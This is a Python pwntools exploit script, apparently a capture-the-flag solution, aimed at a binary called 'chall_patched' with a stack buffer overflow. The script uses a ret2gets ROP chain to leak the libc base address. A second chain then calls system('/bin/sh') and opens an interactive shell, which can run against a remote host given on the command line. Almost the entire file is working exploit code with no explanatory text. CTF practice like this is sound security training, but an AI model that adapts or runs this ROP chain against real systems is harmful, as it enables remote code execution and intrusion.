#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('chall_patched')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *main+460
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

"""
ref: https://sashactf.gitbook.io/pwn-notes/pwn/rop-2.34+/ret2gets#leaking-libc
"""

def init():
    global io

    io = start()


def solve():

    offset = 72
    pop_rbp = 0x40115d # pop rbp; ret;
    ret = 0x401016 # ret;
    
    payload = flat({
        offset: [
            exe.plt["gets"],
            pop_rbp,
            0,
            exe.plt["gets"],
            exe.plt["puts"],
            exe.sym["main"]
        ]
    })

    io.sendline(b"1")
    io.sendlineafter(b"name:", payload)
    io.sendline(b"1")
    io.sendline(b"2")

    io.sendline(b"A" * 4 + b"\x00"*3)
    io.recvuntil(b"AAAA\xff\xff\xff\xff")
    libc.address = u64(io.recv(6).ljust(8, b"\x00")) + 0x28c0
    info("libc base: %#x", libc.address)

    rop = ROP(libc)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    sh = next(libc.search(b"/bin/sh\x00"))
    system = libc.sym["system"]

    payload = flat({
        offset: [
            pop_rdi,
            sh,
            ret,
            system
        ]
    })

    io.sendline(b"1")
    io.sendlineafter(b"name:", payload)
    io.sendline(b"1")
    io.sendline(b"2")
    
    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

